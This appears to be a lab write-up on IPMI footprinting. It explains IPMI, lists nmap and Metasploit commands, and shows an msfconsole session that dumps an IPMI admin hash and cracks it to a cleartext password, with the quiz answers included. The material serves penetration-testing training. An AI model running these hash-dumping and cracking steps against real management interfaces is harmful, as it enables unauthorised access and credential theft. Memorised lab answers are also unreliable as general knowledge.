IPMI
Intelligent Platform Management Interface (IPMI) is a set of standardized specifications for hardware-based host management systems used for system management and monitoring.
It acts as an autonomous subsystem and works independently of the host's BIOS, CPU, firmware, and underlying operating system. IPMI provides sysadmins with the ability to manage and monitor systems even if they are powered off or in an unresponsive state.
It operates using a direct network connection to the system's hardware and does not require access to the operating system via a login shell. 
IPMI can also be used for remote upgrades to systems without requiring physical access to the target host. IPMI is typically used in three ways:

Before the OS has booted to modify BIOS settings
When the host is fully powered down
Access to a host after a system failure


Footprinting: IPMI
Nmap: sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local
Metasploit version scan: auxiliary/scanner/ipmi/ipmi_version
Metasploit dumpint hashes: auxiliary/scanner/ipmi/ipmi_dumphashes


Lab: IPMI
What username is configured for accessing the host via IPMI?

└──╼ [★]$ msfconsole
Metasploit tip: Use the analyze command to suggest runnable modules for 
hosts
                                                  
<SNIP>

[msf](Jobs:0 Agents:0) >> use auxiliary/scanner/ipmi/ipmi_dumphashes 

msf](Jobs:0 Agents:0) auxiliary(scanner/ipmi/ipmi_dumphashes) >> set RHOSTS 
RHOSTS => 

[msf](Jobs:0 Agents:0) auxiliary(scanner/ipmi/ipmi_dumphashes) >> set PASS_FILE ~/rockyou.txt
PASS_FILE => ~/rockyou.txt

[msf](Jobs:0 Agents:0) auxiliary(scanner/ipmi/ipmi_dumphashes) >> run
 - IPMI - Hash found: admin:b51956a882000000a0438c151b0508f4fce53e6ef0564db4642279a890830b647b3870d932e7207ca123456789abcdefa123456789abcdef140561646d696e:35a22762d1ddd54d084c12eecaed32e807ab14cc


Answer: admin


What is the account's cleartext password?
[msf](Jobs:0 Agents:0) auxiliary(scanner/ipmi/ipmi_dumphashes) >> run
- IPMI - Hash found: admin:b51956a882000000a0438c151b0508f4fce53e6ef0564db4642279a890830b647b3870d932e7207ca123456789abcdefa123456789abcdef140561646d696e:35a22762d1ddd54d084c12eecaed32e807ab14cc
 - IPMI - Hash for user 'admin' matches password 'trinity'
[*] Auxiliary module execution completed

Answer: trinity
